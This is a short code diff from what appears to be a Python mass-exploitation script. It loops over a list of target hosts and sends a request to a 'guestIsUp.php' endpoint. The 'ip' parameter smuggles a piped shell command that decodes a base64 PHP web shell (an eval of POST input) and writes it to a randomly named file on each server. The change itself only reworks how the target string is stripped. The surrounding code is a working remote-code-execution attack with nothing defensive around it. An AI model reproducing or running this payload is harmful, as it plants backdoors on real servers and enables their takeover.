@@ -20,7 +20,8 @@ def main(targets):
     shellcontent = "PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==" # cat shell.php | base64
     with open(targets) as f:
         for target in f.readlines():
-            url = target.strip() + "/guest_auth/guestIsUp.php"
+            target = target.strip()
+            url = target + "/guest_auth/guestIsUp.php"
             shellname = str(random.randrange(8888,9999))+'.php'
             data = 'ip=127.0.0.1|echo "'+shellcontent+'"|base64 -d > '+shellname+'&mac=00-00'
             try:
